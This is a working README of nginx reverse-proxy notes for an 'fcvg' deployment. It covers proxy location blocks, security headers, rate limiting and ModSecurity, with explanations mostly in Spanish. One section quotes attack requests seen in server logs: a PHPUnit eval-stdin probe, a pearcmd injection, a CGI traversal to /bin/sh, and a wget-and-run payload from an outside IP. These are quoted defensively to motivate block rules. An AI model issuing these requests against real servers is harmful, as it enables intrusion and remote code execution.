# fcvg-nginx-frontal

Test

    Should change the url of be backend
    to avoid conflict with nextjs api

I
could be change to apiv1

       location ^~ /apiv1/ {
            rewrite ^/apiv1(/.*)$ $1 break;
            proxy_set_header X-Real-IP  $remote_addr;
            proxy_set_header X-Forwarded-For $remote_addr;
            proxy_set_header Host $host;

            proxy_read_timeout 10s;
            proxy_connect_timeout 5s;
            proxy_send_timeout 5s;

            proxy_pass http://fcvg-adm-be;
            proxy_next_upstream error timeout invalid_header http_502 http_503 http_504;
            proxy_intercept_errors on;
            error_page 502 = @fcvg-adm-be_fallback;
        }


    location @fcvg-adm-be_fallback {
        return 503;
    }


    Intentos de acceso a scripts de PHPUnit:

Varias solicitudes buscan archivos eval-stdin.php en directorios asociados con PHPUnit. PHPUnit es un marco de pruebas para PHP, y si está mal configurado o accesible públicamente, puede ser explotado para ejecutar código arbitrario.
Ejemplo: GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Inyecciones y acceso a scripts potencialmente peligrosos:

Varias solicitudes intentan ejecutar comandos del sistema o cargar scripts desde ubicaciones específicas.
Ejemplo: GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\x22hi\x22));?>+/tmp/index1.php
Ejemplo: GET /shell?cd+/tmp;rm+-rf+\*;wget+ 192.52.167.197/jaws;sh+/tmp/jaws
Solicitudes de comandos CGI:

Solicitudes que intentan acceder a scripts en el directorio CGI para ejecutar comandos.
Ejemplo: POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
Solicitudes de archivos binarios:

Solicitudes con contenido binario que podrían estar intentando explotar vulnerabilidades en los servidores HTTP.
Ejemplo: \x03\x00\x00\x13\x0E\xE0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00

/_
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header X-Content-Type-Options nosniff;
add_header X-Frame-Options DENY;
add_header X-XSS-Protection "1; mode=block";
add_header Referrer-Policy "no-referrer-when-downgrade";
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'self'";
_/

add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always :

Claro, la directiva add_header Strict-Transport-Security se utiliza para configurar la política de seguridad de transporte estricto (Strict-Transport-Security, HSTS) en NGINX. Permíteme desglosar los elementos de esta directiva:

max-age=31536000: Esto establece el tiempo máximo, en segundos, que el navegador debe recordar que un sitio solo puede ser accedido a través de HTTPS. En este caso, se establece en 31536000 segundos, lo que equivale a un año. Durante este período, el navegador del usuario recordará forzar la conexión a través de HTTPS en cada visita al sitio web, incluso si el usuario intenta acceder a través de HTTP.

includeSubDomains: Esta opción indica al navegador que también aplique la política HSTS a todos los subdominios del dominio principal. Esto es útil si tu sitio web utiliza subdominios y deseas garantizar que todos estén protegidos por HSTS.

preload: Esta opción indica que el sitio web está listo para ser incluido en la lista de pre-carga HSTS de los navegadores. Esta lista es mantenida por los principales navegadores y garantiza que el sitio siempre se cargue a través de HTTPS, incluso en la primera visita, sin depender de la política HSTS enviada por el servidor.

always: Esta opción indica que la directiva de encabezado se debe agregar a todas las respuestas del servidor, independientemente del código de estado de la respuesta. Esto garantiza que la política HSTS se aplique de manera consistente a todas las páginas del sitio web.

En resumen, la directiva add_header Strict-Transport-Security con estos parámetros configura una política de seguridad de transporte estricto que instruye a los navegadores a forzar la conexión a través de HTTPS en todo el sitio web, incluidos los subdominios, durante un año. Además, indica que el sitio está listo para ser incluido en la lista de pre-carga HSTS de los navegadores. Esto ayuda a proteger la comunicación entre el navegador y el servidor contra ataques de intermediarios y garantiza una experiencia segura para los usuarios.

https://www.acunetix.com/blog/web-security-zone/hardening-nginx/

client_body_buffer_size – use this directive to specify the client request body buffer size. The default value is 8k or 16k but it is recommended to set this as low as 1k: client_body_buffer_size 1k.
client_header_buffer_size – use this directive to specify the header buffer size for the client request header. A buffer size of 1k is adequate for most requests.
client_max_body_size – use this directive to specify the maximum accepted body size for a client request. A 1k directive should be sufficient but you need to increase it if you are receiving file uploads via the POST method.
large_client_header_buffers – use this directive to specify the maximum number and size of buffers to be used to read large client request headers. A large_client_header_buffers 2 1k directive sets the maximum number of buffers to 2, each with a maximum size of 1k. This directive will accept 2 kB data URI.

https://serverfault.com/questions/179646/nginx-throttle-requests-to-prevent-abuse

https://gcore.com/learning/nginx-for-ddos-protection/

Explicacion :

¿Qué hace esta directiva?
Esta directiva limita la cantidad de solicitudes (requests) que una dirección IP puede hacer al servidor en un período de tiempo. Es como poner un semáforo en la puerta de la tienda para que solo cierto número de personas puedan entrar por minuto, evitando que la tienda se llene demasiado rápido y colapse.

Configuración paso a paso
Definición de la zona de límite:

nginx
Copy code
limit_req_zone $binary_remote_addr zone=req_limit_per_ip:10m rate=5r/s;
$binary_remote_addr: Esto se refiere a la dirección IP de quien está haciendo la solicitud.
zone=req_limit_per_ip:10m: Crea una "zona" en la memoria del servidor que puede manejar las limitaciones para las IPs. Aquí, "10m" significa 10 megabytes de memoria para esta zona.
rate=5r/s: Establece la tasa de solicitudes permitidas, en este caso, 5 solicitudes por segundo desde una misma IP.
Aplicación de la limitación en el servidor:

nginx
Copy code
server {
...
limit_req zone=req_limit_per_ip burst=10 nodelay;
}
zone=req_limit_per_ip: Aplica la configuración de limitación de la zona que definimos antes.
burst=10: Permite un "estallido" de hasta 10 solicitudes adicionales que pueden ser manejadas de inmediato sin ser rechazadas. Es como permitir que algunas personas pasen rápidamente por el semáforo si de repente hay un pequeño grupo.
nodelay: Significa que las solicitudes adicionales permitidas por el "burst" se manejan de inmediato, sin hacer esperar a las solicitudes en cola.
¿Por qué empezar con 20?
El valor de 20 solicitudes es una buena referencia inicial porque:

Balancea carga y acceso: Permite suficiente tráfico legítimo sin bloquear a los usuarios normales, pero limita el impacto de un ataque masivo.
Flexible para ajustes: Es un punto de partida que puedes ajustar según el comportamiento de tu tráfico real. Puedes aumentarlo o reducirlo basado en tus necesidades y observaciones.
Resumen de la configuración
Define una zona de límite usando la IP del solicitante y establece una tasa de solicitudes permitidas.
Aplica esa limitación en el servidor, permitiendo un pequeño exceso de solicitudes inmediatas para manejar picos momentáneos.
Esta configuración ayuda a proteger tu servidor de un exceso de solicitudes de una misma IP, mitigando ataques DDoS y manteniendo el servicio disponible para usuarios legítimos.

/_
SecRuleEngine On
SecDefaultAction \"phase:1,deny,log\"
SecServerSignature fcvgServer
_/

        location ^~ /soft-vault/ {
            rewrite ^/soft-vault(/.*)$ $1 break;
            proxy_set_header X-Real-IP  $remote_addr;
            proxy_set_header X-Forwarded-For $remote_addr;
            proxy_set_header Host $host;

            proxy_read_timeout 10s;
            proxy_connect_timeout 5s;
            proxy_send_timeout 5s;

            proxy_pass http://softvalue-public-next:5001/;
            proxy_next_upstream error timeout invalid_header http_502 http_503 http_504;
            proxy_intercept_errors on;
            error_page 502 = @softvalue-public-next_fallback;
        }

     location ^~ / {
        proxy_set_header X-Real-IP  $remote_addr;
        proxy_set_header X-Forwarded-For $remote_addr;
        proxy_set_header Host $host;

        proxy_read_timeout 10s;
        proxy_connect_timeout 5s;
        proxy_send_timeout 5s;

        proxy_pass http://fcvg-public-next:5000/;
        proxy_next_upstream error timeout invalid_header http_502 http_503 http_504;
        proxy_intercept_errors on;
        error_page 502 = @fcvg-public-next_fallback;

         # Bloquear solicitudes peligrosas
        if ($request_uri ~* "\.(php|sh)") {
            return 403;
        }

        # Bloquea solicitudes que intentan acceder a scripts CGI
        location ~* /(\.|/)\.(cgi|sh|pl|py|php|asp|jsp|exe|bat|bin|dll) {
            return 403;
        }

        limit_req zone=req_limit_per_ip burst=20 nodelay;
    }

limit_req_zone $binary_remote_addr zone=req_limit_per_ip:10m rate=5r/s;: Esta directiva define una zona de memoria compartida llamada req_limit_per_ip y limita la tasa de solicitudes a 5 por segundo por dirección IP.

upstream softvalue-public-next y upstream fcvg-adm-frontend: Definen grupos de servidores backend. Aunque actualmente solo tienes un servidor por grupo, esto facilita la ampliación futura y el manejo de errores.

proxy_next_upstream error timeout invalid_header http_502 http_503 http_504;: Indica a NGINX que intente el próximo servidor backend si se encuentra con ciertos tipos de errores.

proxy_intercept_errors on; y error_page 502 = @fcvg-public-next_fallback;: Permiten que NGINX maneje los errores del backend y redirija a una ubicación de fallback específica en caso de que se produzca un error.

Bloque de servidor predeterminado: Este bloque actúa como un servidor de respaldo que maneja cualquier solicitud que no coincida con los otros servidores definidos. Devuelve un código de estado 503 (Servicio No Disponible) para indicar que no hay servicios disponibles.

// Para probar la renovacion de certificados dentro del inspect de portainer: certbot renew --dry-run

# Configuración para la ruta principal

        location ^~ / {
            proxy_set_header X-Real-IP  $remote_addr;
            proxy_set_header X-Forwarded-For $remote_addr;
            proxy_set_header Host $host;

            proxy_read_timeout 10s;
            proxy_connect_timeout 5s;
            proxy_send_timeout 5s;

            proxy_pass http://ns-front; # Usar upstream definido
            proxy_next_upstream error timeout invalid_header http_502 http_503 http_504;
            proxy_intercept_errors on;
            error_page 502 = @ns-front_fallback;

            # Bloquear solicitudes peligrosas
            if ($request_uri ~* "\.(php|sh)") {
                return 403;
            }

            # Bloquea solicitudes que intentan acceder a scripts CGI
            location ~* /(\.|/)\.(cgi|sh|pl|py|php|asp|jsp|exe|bat|bin|dll) {
                return 403;
            }

            limit_req zone=req_limit_per_ip burst=20 nodelay;
        }


    location ^~ / {
            proxy_set_header X-Real-IP  $remote_addr;
            proxy_set_header X-Forwarded-For $remote_addr;
            proxy_set_header Host $host;

            proxy_read_timeout 10s;
            proxy_connect_timeout 5s;
            proxy_send_timeout 5s;

            proxy_pass http://ns-front; # Usar upstream definido
            proxy_next_upstream error timeout invalid_header http_502 http_503 http_504;
            proxy_intercept_errors on;
            error_page 502 = @ns-front_fallback;

            # Bloquear solicitudes peligrosas
            if ($request_uri ~* "\.(php|sh)") {
                return 403;
            }

            # Bloquea solicitudes que intentan acceder a scripts CGI
            location ~* /(\.|/)\.(cgi|sh|pl|py|php|asp|jsp|exe|bat|bin|dll) {
                return 403;
            }

            limit_req zone=req_limit_per_ip burst=20 nodelay;
        }

To update only the rules :
git commit -am "[update-rules] Added new ModSecurity rule"
test 2
